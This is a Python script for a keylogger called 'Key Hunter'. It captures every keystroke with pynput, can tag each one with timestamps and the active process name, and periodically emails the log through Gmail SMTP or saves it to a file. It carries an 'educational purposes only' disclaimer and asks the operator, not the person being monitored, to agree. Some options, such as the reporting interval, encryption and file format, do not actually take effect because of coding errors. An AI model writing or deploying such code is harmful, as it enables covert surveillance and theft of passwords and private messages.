import pynput
import smtplib
import threading
from datetime import datetime
import re
import os
import psutil
from pyfiglet import figlet_format

log = ""
ascii_art = figlet_format("Key Hunter", font="big")
print(ascii_art)
print("Please note that this script is for educational purposes only,\nand the developer is not responsible for any damages or misuses of the script.\nIt is illegal to use this script to gather information without proper authorization\nand it is strongly recommended to use it for educational and testing purposes only.")
email = ""
password = ""
frequency = 60
log_key_type = ""
include_timestamps = False
include_process_name = False
file_path = ""
file_name = "key_logs.txt"
file_format = "txt"
encryption = False
handle_errors = "stop"
handle_file = "overwrite"

def get_user_credentials():
    global email, password
    email = input("Enter your email address: ")
    match = re.match('^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$', email)
    if match == None:
        print('Invalid email address')
        get_user_credentials()
    password = input("Enter your email password: ")

def process_key_press(key):
    global log
    try:
        if log_key_type == "all":
            log += str(key.char)
        elif log_key_type == "alphanumeric":
            if key.char.isalnum():
                log += str(key.char)
        elif log_key_type == "special":
            if not key.char.isalnum():
                log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
    if include_timestamps:
        log += " " + str(datetime.now())
    if include_process_name:
        process_name = psutil.Process().name()
        log += " " + process_name

def write_log_to_file():
    try:
        if handle_file == "overwrite":
            file_mode = "w"
        else:
            file_mode = "a"
        with open(file_path + file_name, file_mode) as file:
            file.write(log)
    except Exception as e:
        print(f"An error occurred while writing to the file: {e}.")
        if handle_errors == "stop":
            exit()

def send_log_via_email():
    global log, email, password
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(email, password)
    except smtplib.SMTPAuthenticationError:
        print("Invalid login credentials.")
        if handle_errors == "stop":
            exit()
        return
    log = log + "\n" + str(datetime.now())
    try:
        server.sendmail(email, email, log)
    except smtplib.SMTPException as e:
        print(f"An error occurred while sending the email: {e}.")
        if handle_errors == "stop":
            exit()
    server.quit()

def report():
    global log, email, password
    method = input("Do you want to receive the log in an email or save it to a file on your local machine? (email/file) ")
    if method == "file":
        write_log_to_file()
    elif method == "email":
        send_log_via_email()
    else:
        print("Invalid option")
        if handle_errors == "stop":
            exit()
    log = ""
    timer = threading.Timer(frequency, report)
    timer.start()

def start_logging():
    global include_timestamps, include_process_name, log_key_type, file_path, file_format, encryption, handle_errors
    print("It is important to obtain proper consent from the user before using this script , and to use it only for legal and legitimate purposes.")
    user_choice = input("Do you agree to use this script only for educational purposes? (yes/no) ")
    if user_choice.lower() != "yes":
        print("Exiting the script.")
        exit()
    get_user_credentials()
    frequency_choice = input("Enter the frequency (in seconds) at which you want to send the email (default 60 sec): ")
    if frequency_choice.isdigit():
        frequency = int(frequency_choice)
    include_timestamps = input("Do you want to include timestamps with each logged key press? (yes/no) ")
    include_timestamps = include_timestamps.lower() == "yes"
    include_process_name = input("Do you want to include the name of the application in which the key press occurred? (yes/no) ")
    include_process_name = include_process_name.lower() == "yes"
    log_key_type = input("Do you want to log all key presses, or only specific key presses like alphanumeric or special characters? (all/alphanumeric/special)")
    file_path = input("Enter the location where you want to save the log file: ")
    file_format = input("Enter the format of the log file (txt/csv/json): ")
    encryption = input("Do you want to encrypt the log file before sending it over email or saving it on the local machine? (yes/no) ")
    encryption = encryption.lower() == "yes"
    handle_errors = input("How do you want to handle errors, whether to stop the script or continue? (stop/continue) ")
    handle_file = input("How do you want to handle the log file, whether to overwrite it or append the new logs to it? (overwrite/append) ")
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

start_logging()
